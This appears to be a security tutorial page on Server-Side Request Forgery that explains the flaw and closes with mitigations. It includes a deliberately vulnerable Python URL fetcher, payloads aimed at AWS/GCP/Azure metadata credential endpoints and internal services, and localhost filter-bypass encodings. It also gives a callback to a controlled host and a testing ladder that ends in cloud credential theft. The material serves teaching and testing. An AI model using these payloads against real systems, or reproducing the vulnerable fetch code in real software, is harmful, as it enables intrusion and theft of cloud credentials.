# Server-Side Request Forgery (SSRF) (A10:2021)

SSRF is when an attacker makes the **server** send HTTP (or other) requests to a destination the attacker chooses. Because the request comes *from the server*, it can reach internal systems the attacker can't touch directly - internal admin panels, cloud metadata endpoints, databases - and it inherits the server's network position and trust.

Vulnerable code:

```python
# VULNERABLE - the app fetches whatever URL the user supplies
url = request.args.get('url')
resp = requests.get(url)     # attacker controls where the server connects
return resp.text
```

Request `?url=http://169.254.169.254/latest/meta-data/` and the server fetches AWS credentials for you.

## Where SSRF hides

Any feature that takes a URL/host and fetches it: webhooks, "import from URL", PDF/HTML/image generators, URL preview/unfurling, file uploads by URL, XML parsers (XXE), and integrations.

## Impact

- Read **cloud metadata** -> steal IAM credentials (AWS/GCP/Azure) -> full cloud takeover
- Reach **internal-only services** (`localhost`, `10.x`, `192.168.x`) - admin panels, Redis, Elasticsearch
- **Port scan** the internal network
- **RCE** by hitting internal services with known exploits

## Key payloads

```text
# Cloud metadata (the crown jewels)
http://169.254.169.254/latest/meta-data/iam/security-credentials/    # AWS IMDSv1
http://metadata.google.internal/computeMetadata/v1/                   # GCP (needs header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01       # Azure (needs header)

# Internal services
http://localhost/admin
http://127.0.0.1:6379/         # Redis
http://127.0.0.1:9200/         # Elasticsearch

# Confirm blind SSRF with a callback you control
http://YOURID.oastify.com/
```

## Filter bypasses (when localhost/metadata IP is blocked)

```text
# Alternate representations of 127.0.0.1
http://127.1
http://0177.0.0.1          (octal)
http://2130706433          (decimal)
http://0x7f.0.0.1          (hex)
http://[::1]               (IPv6 loopback)
http://localtest.me        (resolves to 127.0.0.1)

# Bypass allowlist with a domain you own that resolves to 169.254.169.254
# or use DNS rebinding

# Trick parsers with @ / # / redirects
http://expected.com@169.254.169.254/
http://169.254.169.254#expected.com
# an open redirect on an allowed host -> follow it to the internal target
```

## Step-by-step testing

1. Find a parameter that makes the server fetch something.
2. Point it at a Burp Collaborator / interactsh URL - callback = **SSRF confirmed** (even if blind).
3. Try `http://localhost/` and internal IPs; watch for different responses.
4. Hit cloud metadata; if creds return, escalate into the cloud account.
5. If filtered, work the bypass ladder above.

## Tools

- [Burp Suite Collaborator](https://portswigger.net/burp) / [interactsh](https://github.com/projectdiscovery/interactsh) - detect blind SSRF
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap) - automated SSRF exploitation
- [Gopherus](https://github.com/tarunkant/Gopherus) - build `gopher://` payloads to hit Redis/MySQL/etc.

## Mitigation - the fix

- **Allowlist** the exact hosts/schemes the feature may reach; deny everything else.
- Resolve the hostname and **validate the resulting IP** (block private/link-local ranges) - re-check after redirects to stop DNS rebinding.
- Disable unused URL schemes (`file://`, `gopher://`, `dict://`).
- Require **IMDSv2** (token-based) on AWS and restrict metadata access.
- Isolate the fetching service on a network segment with no internal access.

## Practice

- [PortSwigger SSRF labs](https://portswigger.net/web-security/ssrf)

## Reference

- [OWASP A10:2021 SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
